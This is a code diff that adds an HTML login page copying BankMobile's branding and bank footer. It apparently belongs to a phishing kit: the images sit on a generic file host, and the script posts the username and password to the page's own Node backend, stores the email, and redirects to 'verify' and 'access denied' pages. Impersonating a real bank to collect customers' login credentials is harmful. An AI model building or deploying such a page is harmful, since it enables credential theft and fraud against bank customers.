@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+    <title>BankMobile Login</title>
+    
+    <link rel="icon" type="image/png" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    <link rel="stylesheet" href="/lib/bootstrap/dist/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="/css/site.css" />
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-image: url('https://cdn.corenexis.com/f/5upabsqQ4fJ.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px 40px 20px;
+            color: #1a1a1a;
+        }
+
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            max-width: 410px;
+        }
+
+        h1 {
+            color: #1C1C1C;
+            font-family: Museo-Slab-Bold, Rockwell, "Rockwell Nova", "Courier New", Georgia, serif;
+            font-size: 29px;
+            font-style: normal;
+            font-weight: 550;
+            line-height: 36px;
+            text-align: left;
+            margin-bottom: 32px;
+            letter-spacing: -0.3px;
+            padding-left: 36px;
+        }
+
+        .card {
+            margin: auto;
+            width: 375px;
+            flex-shrink: 0;
+            background: #FFF;
+            box-shadow: 0px 1px 5px 0px rgba(0, 0, 0, 0.10);
+            padding: 24px;
+            border: 1px solid #e2e8f0;
+            border-radius: 0px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 14px;
+            font-size: 15px;
+            border: 1px solid #767676;
+            border-radius: 0px;
+            outline: none;
+            color: #222;
+            font-family: inherit;
+            font-weight: 500;
+            transition: border-color 0.1s ease;
+        }
+
+        .input-group input::placeholder {
+            color: #616161;
+            font-weight: 500; 
+        }
+
+        .input-group input:focus {
+            border: 2px solid #000000;
+            padding: 15px 13px;
+        }
+
+        .input-group input.invalid-field {
+            border-color: #d32f2f;
+        }
+
+        .input-group input.invalid-field:focus {
+            border-color: #d32f2f;
+        }
+
+        .field-error-msg {
+            display: none;
+            color: #d32f2f;
+            font-size: 12.5px;
+            font-weight: 500;
+            margin-top: 6px;
+            text-align: left;
+            padding-left: 2px;
+        }
+
+        .password-container {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #444;
+        }
+
+        .error-container {
+            display: none; 
+            align-items: flex-start;
+            gap: 8px;
+            color: #d32f2f;
+            font-size: 13.5px;
+            line-height: 1.45;
+            margin-top: 15px;
+            margin-bottom: 15px;
+            padding-left: 2px;
+        }
+
+        .error-icon {
+            flex-shrink: 0;
+            margin-top: 2px;
+            color: #d32f2f;
+        }
+
+        .error-text {
+            font-weight: 400;
+            text-align: left;
+        }
+
+        .forgot-link-container {
+            text-align: right;
+            margin-top: 15px;
+        }
+
+        .forgot-link {
+            color: #0F44FF !important;
+            text-align: right;
+            font-family: Lato-Regular, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 14px;
+            font-style: normal;
+            font-weight: 500;
+            line-height: 20px;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .forgot-link:hover {
+            color: #0a36cc !important;
+            text-decoration: underline;
+        }
+
+        .login-btn {
+            display: flex;
+            padding: 16px 24px;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            flex: 1 0 0;
+            margin: 80px auto 0 auto;
+            background-color: #d7e7f5;
+            color: #9cb4cc;
+            border: none;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: not-allowed;
+            border-radius: 0px;
+            text-align: center;
+            transition: all 0.2s ease;
+            width: 375px;
+            max-width: 100%;
+            min-height: 56px;
+        }
+
+        .login-btn.active {
+            background-color: #0056b3;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .login-btn.active:hover {
+            background-color: #003d82;
+        }
+
+        .login-btn.loading {
+            background-color: #4a7fb5;
+            cursor: wait;
+            opacity: 0.8;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+            20%, 40%, 60%, 80% { transform: translateX(10px); }
+        }
+
+        .shake {
+            animation: shake 0.5s ease-in-out;
+        }
+
+        .success-container {
+            display: none;
+            align-items: flex-start;
+            gap: 8px;
+            color: #2e7d32;
+            font-size: 13.5px;
+            line-height: 1.45;
+            margin-top: 15px;
+            margin-bottom: 15px;
+            padding-left: 2px;
+        }
+
+        .success-icon {
+            flex-shrink: 0;
+            margin-top: 2px;
+            color: #2e7d32;
+        }
+
+        footer {
+            font-size: 14px;
+            color: #212529;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 800px;
+            width: 100%;
+            margin-top: auto;
+            padding-top: 60px;
+            white-space: nowrap;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <h1>Log in to your<br>BankMobile Account</h1>
+
+        <div class="card">
+            <form id="loginForm" onsubmit="event.preventDefault();">
+                <div class="input-group">
+                    <input type="text" id="username" name="username" placeholder="Username" aria-label="Username" required autocomplete="off">
+                    <div class="field-error-msg" id="usernameError">Please enter a valid email address.</div>
+                </div>
+                
+                <div class="input-group password-container">
+                    <input type="password" id="password" name="password" placeholder="Password" aria-label="Password" required autocomplete="off">
+                    <button type="button" class="toggle-password" aria-label="Toggle password visibility">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+
+                <div class="error-container" id="errorNotification">
+                    <svg class="error-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <line x1="12" y1="8" x2="12" y2="12"></line>
+                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                    </svg>
+                    <span class="error-text" id="errorMessage">
+                        Invalid login attempt. Please check your credentials and try again.
+                    </span>
+                </div>
+
+                <div class="success-container" id="successNotification">
+                    <svg class="success-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                    </svg>
+                    <span class="error-text">Login successful! Redirecting...</span>
+                </div>
+
+                <div class="forgot-link-container">
+                    <a href="forget.html" class="forgot-link">Forgot login information?</a>
+                </div>
+            </form>
+        </div>
+
+        <button type="submit" form="loginForm" class="login-btn" id="submitBtn" disabled>Login</button>
+    </div>
+
+    <footer>
+        © 2026 BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved.<br>
+        Powered by BM Technologies, Inc. BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC.
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const togglePasswordBtn = document.querySelector('.toggle-password');
+            const loginButton = document.getElementById('submitBtn');
+            const errorNotification = document.getElementById('errorNotification');
+            const errorMessage = document.getElementById('errorMessage');
+            const successNotification = document.getElementById('successNotification');
+            const usernameError = document.getElementById('usernameError');
+            const loginForm = document.getElementById('loginForm');
+
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const SERVER_URL = 'http://localhost:3000';
+
+            // Password toggle
+            togglePasswordBtn.addEventListener('click', function () {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                this.style.opacity = type === 'text' ? '0.4' : '1';
+            });
+
+            function validateEmailFormat(value) {
+                return emailRegex.test(value.trim());
+            }
+
+            function checkInputs() {
+                const hasUsername = usernameInput.value.trim() !== "";
+                const hasPassword = passwordInput.value.trim() !== "";
+                
+                if (hasUsername && hasPassword) {
+                    loginButton.classList.add('active');
+                    loginButton.disabled = false;
+                } else {
+                    loginButton.classList.remove('active');
+                    loginButton.disabled = true;
+                }
+            }
+
+            async function checkLogin(email, password) {
+                try {
+                    const response = await fetch(`${SERVER_URL}/api/login`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            username: email,
+                            password: password
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    return data;
+                    
+                } catch (error) {
+                    console.error('Server error:', error);
+                    return { 
+                        success: false, 
+                        message: 'Could not connect to server. Make sure server is running on port 3000.',
+                        error: error.message 
+                    };
+                }
+            }
+
+            async function testServer() {
+                try {
+                    const response = await fetch(`${SERVER_URL}/api/health`);
+                    return response.ok;
+                } catch {
+                    return false;
+                }
+            }
+
+            usernameInput.addEventListener('input', function() {
+                checkInputs();
+                usernameError.style.display = "none";
+                usernameInput.classList.remove('invalid-field');
+                errorNotification.style.display = "none";
+                successNotification.style.display = "none";
+            });
+
+            usernameInput.addEventListener('blur', function() {
+                const val = usernameInput.value.trim();
+                if (val !== "" && !validateEmailFormat(val)) {
+                    usernameError.style.display = "block";
+                    usernameInput.classList.add('invalid-field');
+                } else {
+                    usernameError.style.display = "none";
+                    usernameInput.classList.remove('invalid-field');
+                }
+            });
+
+            passwordInput.addEventListener('input', function() {
+                checkInputs();
+                errorNotification.style.display = "none";
+                successNotification.style.display = "none";
+            });
+
+            testServer().then(connected => {
+                if (!connected) {
+                    console.warn('⚠️ Server not running. Start with: node server.js');
+                } else {
+                    console.log('✅ Server connected');
+                }
+            });
+
+            loginForm.addEventListener('submit', async function (event) {
+                event.preventDefault();
+                
+                const email = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
+
+                if (!validateEmailFormat(email)) {
+                    usernameError.style.display = "block";
+                    usernameInput.classList.add('invalid-field');
+                    usernameInput.focus();
+                    return;
+                }
+
+                loginButton.disabled = true;
+                loginButton.innerHTML = '<span class="loading-text"><span class="spinner"></span> Logging in...</span>';
+                loginButton.classList.add('loading');
+
+                errorNotification.style.display = "none";
+                successNotification.style.display = "none";
+
+                try {
+                    const result = await checkLogin(email, password);
+                    
+                    console.log('Login result:', result);
+                    
+                    if (!result.success && result.message && result.message.includes('Could not connect')) {
+                        errorMessage.textContent = '⚠️ Server is not running. Please start the server with: node server.js';
+                        errorNotification.style.display = "flex";
+                        
+                    } else if (result.success) {
+                        successNotification.style.display = "flex";
+                        localStorage.setItem('userEmail', email);
+                        localStorage.setItem('loginSuccess', 'true');
+                        
+                        setTimeout(() => {
+                            window.location.href = result.redirectTo || 'verify.html';
+                        }, 1500);
+                        
+                    } else if (result.redirectTo === 'accessdenied.html') {
+                        localStorage.setItem('loginError', 'Account not found');
+                        localStorage.setItem('userEmail', email);
+                        window.location.href = 'accessdenied.html';
+                        
+                    } else {
+                        errorMessage.textContent = result.message || 'Invalid login attempt. Account may be locked after multiple invalid attempts. To recover login credentials, select "Forgot Login Information?" below.';
+                        errorNotification.style.display = "flex";
+                        loginForm.classList.add('shake');
+                        setTimeout(() => loginForm.classList.remove('shake'), 500);
+                    }
+
+                } catch (error) {
+                    console.error('Login error:', error);
+                    errorMessage.textContent = 'An unexpected error occurred: ' + error.message;
+                    errorNotification.style.display = "flex";
+                    
+                } finally {
+                    loginButton.disabled = false;
+                    loginButton.innerHTML = 'Login';
+                    loginButton.classList.remove('loading');
+                    checkInputs();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
